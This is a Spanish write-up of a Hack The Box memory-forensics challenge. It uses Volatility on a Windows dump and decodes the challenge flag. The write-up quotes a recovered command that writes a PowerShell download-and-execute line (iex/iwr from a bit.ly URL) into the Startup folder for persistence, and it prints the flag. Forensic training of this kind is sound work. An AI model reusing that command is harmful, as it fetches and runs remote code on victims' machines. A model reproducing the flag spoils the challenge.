# Export
*We spotted a suspicious connection to one of our servers, and immediately took a memory dump. Can you figure out what the attackers were up to?*

Como tenemos un memory dump lo primero sera determinar el perfil con **imageinfo**
```
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/pj/Current/HTB/WIN-LQS146OE2S1-20201027-142607.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80001a540a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80001a55d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-10-27 14:26:09 UTC+0000
     Image local date and time : 2020-10-27 19:56:09 +0530
```
Veamos la actividad en consola con el plugin **consoles**
```
echo iex(iwr "http%3A%2F%2Fbit.ly%2FSFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30%3D.ps1") > C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\3usy12fv.ps1
```
Esa orden es la unica que destaca y dado que se ha descargado un fichero externo ps1, al hacer el url decode tenemos lo siguiente:
```
http://bit.ly/SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30=.ps1
```
Lo cual es raro, veamos que significa el nombre del archivo si aplicamos base64 -d a la parte que parece codificada
```
echo 'SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30=' | base64 -d
HTB{W1Nd0ws_f0r3Ns1CS_3H?}
```
Flag **HTB{W1Nd0ws_f0r3Ns1CS_3H?}**
